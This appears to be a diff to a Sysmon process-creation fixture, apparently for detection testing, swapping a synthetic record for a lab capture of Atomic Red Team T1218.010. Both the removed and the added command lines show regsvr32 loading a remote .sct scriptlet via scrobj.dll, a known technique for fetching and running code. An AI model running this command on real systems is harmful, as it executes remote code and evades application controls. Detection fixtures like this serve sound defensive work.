@@ -1,8 +1,10 @@
 {
   "EventID": 1,
+  "UtcTime": "2026-11-15 12:16:37.586",
   "Image": "C:\\Windows\\System32\\regsvr32.exe",
-  "CommandLine": "regsvr32.exe /s /n /u /i:http://10.0.0.5/payload.sct scrobj.dll",
+  "CommandLine": "C:\\Windows\\system32\\regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll",
   "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-  "User": "VICTIM-PC\\analyst",
-  "_provenance": "synthetic"
+  "User": "WIN10-LAB\\analyst",
+  "_provenance": "real-capture",
+  "_atomic_source": "Atomic Red Team T1218.010 (captured via Sysmon)"
 }
